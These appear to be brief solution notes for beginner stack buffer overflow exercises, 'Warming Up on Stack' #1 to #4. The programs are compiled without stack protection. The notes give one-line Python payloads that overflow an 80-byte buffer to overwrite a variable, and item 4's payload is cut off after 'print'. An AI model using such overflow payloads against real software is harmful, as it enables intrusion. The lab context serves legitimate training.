all programs are compiled using 'gcc -g -fno-stack-protector -o output_name input.c

1. Warming Up on Stack #1
python -c 'print "A" * 80 + "DCBA";' | ./stack1

2. Warming Up On Stack #2
python -c 'print "A" * 80 + "\x05\x03\x02\x01";' | ./stack2

3. Warming Up On Stack #3
python -c 'print "A" * 80 + "\x05\x00\x02\x01";' | ./stack3

4. Warming Up On Stack #4
python -c 'print 
note: \x00\x0a will break gets()
